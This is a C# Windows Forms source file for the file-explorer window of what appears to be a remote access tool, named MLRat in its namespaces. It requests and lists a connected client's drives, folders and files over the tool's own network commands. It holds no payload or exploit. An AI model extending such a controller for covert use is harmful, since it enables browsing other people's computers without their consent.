using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    public partial class FileExplorerForm : Form
    {
        public IClient Client { get; set; }
        string CurrentDirectory = string.Empty;
        public FileExplorerForm(IServerUIHandler UIHandler, IClient c)
        {
            Client = c;
            InitializeComponent();
            ImageList images = new ImageList();
            Image uiFolder = UIHandler.GetImage("folder.png");
            Image uiFile = UIHandler.GetImage("file.png");
            Image uiDrive = UIHandler.GetImage("drive.png");
            Image uiError = UIHandler.GetImage("error.png");

            if(uiFolder != null)
                images.Images.Add("Folder", uiFolder);
            if(uiFile!=null)
                images.Images.Add("File", uiFile);
            if(uiDrive!=null)
                images.Images.Add("Drive", uiDrive);
            if(uiError != null)
                images.Images.Add("Error", uiError);
            lvFileView.SmallImageList = images;
            c.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, string.Empty);
        }


        public void BeginUpdate(bool addUpDir)
        {
            Invoke((MethodInvoker)delegate ()
            {
                lvFileView.View = View.Details;
                lvFileView.Items.Clear();
                if (addUpDir)
                {
                    ListViewItem i = new ListViewItem("...");
                    i.Tag = true;
                    i.ImageKey = "Folder";
                    AddItem(i);
                }
            });
        }


        public void InvalidDirectory(string message)
        {
            ListViewItem i = new ListViewItem("Invalid Directory");
            i.Tag = true;
            i.ImageKey = "Error";
            i.SubItems.Add(message);
            AddItem(i);
        }

        void AddItem(ListViewItem i)
        {
            Invoke((MethodInvoker)delegate ()
            {
                lvFileView.Items.Add(i);
            });
        }

        public void AddDrive(string name, string size, string label)
        {
            string dLabel = label;
            if (string.IsNullOrWhiteSpace(dLabel))
                dLabel = "Local Disk";
            ListViewItem i = new ListViewItem(string.Format("{0} ({1})", dLabel, name.Substring(0, name.Length -1)));
            i.Tag = name;
            i.ImageKey = "Drive";
            i.SubItems.Add(size);
            AddItem(i);
        }
        public void AddToList(string name, string size, string key)
        {
            ListViewItem i = new ListViewItem(name);
            i.Tag = false;
            i.ImageKey = key;
            i.SubItems.Add(size);
            AddItem(i);
        }

        private void FileExplorerForm_Load(object sender, EventArgs e)
        {

        }

        private void lvFileView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
           if (lvFileView.View == View.List)
                return;
            if (lvFileView.SelectedItems.Count > 0)
            {
                lvFileView.View = View.List;
                ListViewItem i = lvFileView.SelectedItems[0];
                if (i.ImageKey == "File")
                    return;
                string path = i.Text;
                if (i.ImageKey == "Drive")
                {
                    CurrentDirectory = (string)i.Tag;
                    if (string.IsNullOrWhiteSpace(CurrentDirectory))
                        CurrentDirectory = string.Empty;
                }
                else
                {
                    if ((bool)i.Tag == true)
                    {
                        if (CurrentDirectory.EndsWith(":\\"))
                        {
                            CurrentDirectory = string.Empty;
                        }
                        else
                        {
                            string[] disect = CurrentDirectory.Split('\\');
                            int offset = (disect.Length == 2) ? 0 : 1;
                            CurrentDirectory = CurrentDirectory.Substring(0, (CurrentDirectory.Length - disect[disect.Length - 1].Length) - offset);
                        }
                    }
                    else
                    {

                        if (!CurrentDirectory.EndsWith("\\") && CurrentDirectory != string.Empty)
                            CurrentDirectory += "\\";
                        CurrentDirectory += path;
                        if (string.IsNullOrWhiteSpace(CurrentDirectory))
                            CurrentDirectory = string.Empty;
                    }
                }
                lvFileView.Items.Clear();
                lvFileView.Items.Add("Loading...");
                Console.WriteLine("Current directory: {0}", CurrentDirectory);
                Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvFileView.View == View.List)
                return;
            lvFileView.View = View.List;
            lvFileView.Items.Clear();
            lvFileView.Items.Add("Loading...");
            Console.WriteLine("Current directory: {0}", CurrentDirectory);
            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
        }
    }
}
